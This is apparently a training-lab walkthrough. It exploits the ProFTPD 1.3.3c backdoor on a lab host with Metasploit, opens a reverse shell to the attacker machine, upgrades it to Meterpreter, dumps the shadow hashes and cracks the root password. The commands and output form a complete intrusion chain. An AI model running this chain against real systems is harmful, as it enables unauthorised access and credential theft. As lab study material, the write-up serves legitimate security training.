## Password Cracker: Linux

### Target
`demo.ine.local`

### Tools:
* `msf`
* `nmap`

### Objective: Find the root password
---
```bash
┌──(root㉿INE)-[~]
└─# nmap -Pn -sV demo.ine.local
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-24 07:53 IST
Nmap scan report for demo.ine.local (192.10.78.3)
Host is up (0.000021s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.3c
MAC Address: 02:42:C0:0A:4E:03 (Unknown)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.36 seconds

┌──(root㉿INE)-[~]
└─# searchsploit ProFTPD | grep Metasploit
ProFTPd 1.2 < 1.3.0 (Linux) - 'sreplace' Remote Buffer Overflow (Metasploit)                                                                             | linux/remote/16852.rb
ProFTPd 1.3.0 - 'sreplace' Remote Stack Overflow (Metasploit)                                                                                            | linux/remote/2856.pm
ProFTPd 1.3.2 rc3 < 1.3.3b (FreeBSD) - Telnet IAC Buffer Overflow (Metasploit)                                                                           | linux/remote/16878.rb
ProFTPd 1.3.2 rc3 < 1.3.3b (Linux) - Telnet IAC Buffer Overflow (Metasploit)                                                                             | linux/remote/16851.rb
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                                                                                                | linux/remote/37262.rb
ProFTPd-1.3.3c - Backdoor Command Execution (Metasploit)                                                                                                 | linux/remote/16921.rb
```
```bash
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > set RHOSTS demo.ine.local
RHOSTS => demo.ine.local
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > run

[-] 192.10.78.3:21 - Exploit failed: A payload has not been selected.
[*] Exploit completed, but no session was created.
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > set payload payload/cmd/unix/reverse
payload => cmd/unix/reverse
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > run

[-] 192.10.78.3:21 - Msf::OptionValidateError One or more options failed to validate: LHOST.
[*] Exploit completed, but no session was created.
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > setg LHOST 192.10.78.2
LHOST => 192.10.78.2
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > run

[*] Started reverse TCP double handler on 192.10.78.2:4444 
[*] 192.10.78.3:21 - Sending Backdoor Command
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo cEspDw9E44CrQsD7;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "cEspDw9E44CrQsD7\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (192.10.78.2:4444 -> 192.10.78.3:53350) at 2026-01-24 07:59:36 +0530

shell 
[*] Trying to find binary 'python' on the target machine
[*] Found python at /usr/bin/python
[*] Using `python` to pop up an interactive shell
[*] Trying to find binary 'bash' on the target machine
[*] Found bash at /bin/bash
ls
ls
bin   dev  home  lib64  mnt  proc  run   srv  tmp  var
boot  etc  lib   media  opt  root  sbin  sys  usr
root@demo:/# ^Z
```
```bash
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > sessions

Active sessions
===============

  Id  Name  Type            Information  Connection
  --  ----  ----            -----------  ----------
  1         shell cmd/unix               192.10.78.2:4444 -> 192.10.78.3:53350 (192.10.78.3)

msf6 exploit(unix/ftp/proftpd_133c_backdoor) > sessions -u 1
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]

[*] Upgrading session ID: 1
[-] Shells on the target platform, unix, cannot be upgraded to Meterpreter at this time.
```
We tried to open a shell.
```bash
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > sessions -i 1
[*] Starting interaction with 1...


root@demo:/# exit
exit
exit
ls
bin
boot
dev
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
^Z
Background session 1? [y/N]  y
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > sessions -u 1
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.10.78.2:4433 
[*] Sending stage (1017704 bytes) to 192.10.78.3
[*] Meterpreter session 2 opened (192.10.78.2:4433 -> 192.10.78.3:59414) at 2026-01-24 08:05:59 +0530
[*] Command stager progress: 100.00% (773/773 bytes)
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > 
```
```bash
msf6 post(linux/gather/hashdump) > set SESSION 2
SESSION => 2
msf6 post(linux/gather/hashdump) > run

[+] root:$6$sgewtGbw$ihhoUYASuXTh7Dmw0adpC7a3fBGkf9hkOQCffBQRMIF8/0w6g/Mh4jMWJ0yEFiZyqVQhZ4.vuS8XOyq.hLQBb.:0:0:root:/root:/bin/bash
[+] Unshadowed Password File: /root/.msf4/loot/20260124080855_default_192.10.78.3_linux.hashes_517653.txt
[*] Post module execution completed
msf6 post(linux/gather/hashdump) > 
```
```bash
msf6 auxiliary(analyze/crack_linux) > creds
Credentials
===========

host  origin       service  public  private                                                                                   realm  private_type        JtR Format    cracked_password
----  ------       -------  ------  -------                                                                                   -----  ------------        ----------    ----------------
      192.10.78.3           root    $6$sgewtGbw$ihhoUYASuXTh7Dmw0adpC7a3fBGkf9hkOQCffBQRMIF8/0w6g/Mh4jMWJ0yEFiZy (TRUNCATED)         Nonreplayable hash  sha512,crypt

msf6 auxiliary(analyze/crack_linux) >
```
```bash
msf6 auxiliary(analyze/crack_linux) > set SHA512 true 
SHA512 => true
msf6 auxiliary(analyze/crack_linux) > run
[*] Running module against 192.10.78.3

[*] No md5crypt found to crack
[*] No descrypt found to crack
[*] No bsdicrypt found to crack
Created directory: /root/.john
[+] john Version Detected: 1.9.0-jumbo-1+bleeding-aec1328d6c 2021-11-02 10:45:52 +0100 OMP
[*] Wordlist file written out to /tmp/jtrtmp20260124-997-wxba5p
[*] Checking sha512crypt hashes already cracked...
[*] Cracking sha512crypt hashes in single mode...
[*]    Cracking Command: /usr/sbin/john --session=Raj0VEYY --no-log --config=/usr/share/metasploit-framework/data/jtr/john.conf --pot=/root/.msf4/john.pot --format=sha512crypt --wordlist=/tmp/jtrtmp20260124-997-wxba5p --rules=single /tmp/hashes_sha512crypt_20260124-997-mip4a7
Using default input encoding: UTF-8
Will run 48 OpenMP threads
Press Ctrl-C to abort, or send SIGUSR1 to john process for status
1g 0:00:00:03 DONE (2026-01-24 08:11) 0.2645g/s 1625p/s 1625c/s 1625C/s 1qwerty..afferent
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
[+] Cracked Hashes
==============

 DB ID  Hash Type    Username  Cracked Password  Method
 -----  ---------    --------  ----------------  ------
 1      sha512crypt  root      password          Single

[*] Auxiliary module execution completed
msf6 auxiliary(analyze/crack_linux) >
```
Flag: **password**